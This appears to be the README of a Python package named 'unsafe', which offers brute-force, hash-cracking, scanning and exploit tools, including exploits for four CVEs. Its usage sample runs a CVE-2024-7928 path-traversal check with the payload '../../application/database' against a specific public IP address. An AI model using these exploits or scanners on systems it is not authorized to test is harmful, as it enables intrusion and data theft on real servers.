![PyPI](https://img.shields.io/pypi/v/unsafe?style=for-the-badge)
![Daily Downloads](https://img.shields.io/pypi/dd/unsafe?style=for-the-badge)
![Weekly Downloads](https://img.shields.io/pypi/dw/unsafe?style=for-the-badge)
![Monthly Downloads](https://img.shields.io/pypi/dm/unsafe?style=for-the-badge)



# Unsafe (Advanced Penetration Testing Module)

Aiming to become the best package available for hacking and security in Python.

- Author : Ahur4
  - [Telegram Channel](https://t.me/Ahura_Rahmani)
  - [Telegram Pv](https://t.me/Ahur4)
# Installation
```bash
pip install unsafe
```
# Features

- [x] **BruteForce**
  - [x] Admin Finder
  - [x] FileManager Finder
  - [x] Cloudflare Bypasser
  - [x] Wordpress Plugin Finder
- [x] **Cryptography**
  - [x] Decrypt
  - [x] Encrypt
  - [x] Hash
  - [x] Crack Hash
- [x] **Exploits**
  - [x] [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)
  - [x] [CVE-2024-7313](https://nvd.nist.gov/vuln/detail/CVE-2024-7313)
  - [x] [CVE-2024-7339](https://nvd.nist.gov/vuln/detail/CVE-2024-7339)
  - [x] [CVE-2024-7928](https://nvd.nist.gov/vuln/detail/CVE-2024-7928)
  - [x] Add more in future.
- [x] Forensic
  - [x] Image Metadata
  - [x] PDF Metadata
  - [x] Audio Metadata
- [x] Network
  - [x] MacAddress Lookup
  - [x] Proxy Tester
  - [x] Port Scanner
  - [x] Proxy Extractor
- [x] Web
  - [x] Search Engine ( For GoogleDorking )
  - [x] Crawler
  - [x] Xss Scanner
  - [x] SQL Injection Scanner

## Usage
Exploit Sample
```python
from unsafe import exploits

penetration_tester = exploits.CVE_2024_7928(
    url="http://47.105.229.158:9001",
    path="/index/ajax/lang",
    key="lang",
    value="../../application/database",
)
result = penetration_tester.check_vuln()
if result is not None:
    print("Target is vulnerable !")
    print("\n".join([f"{k} : {v}" for k, v in result.items()]))
else:
    print("Target is not vulnerable !")
```

Mac Address lookup/Port scanner
```python
from unsafe import network

# macaddress lookup
mac_address = "00:00:5e:00:53:af"
lookup = network.mac_address_lookup(mac=mac_address)
print(lookup)

# port scanning
ports = [80, 443, 21, 27017, 9002]
ip = "127.0.0.1"
open_ports = network.port_scanner(host=ip, ports=ports)
print(open_ports)
```
### [More Examples on Github](https://github.com/ahur4/unsafe/tree/main/example)
# New Features : Coming Soon...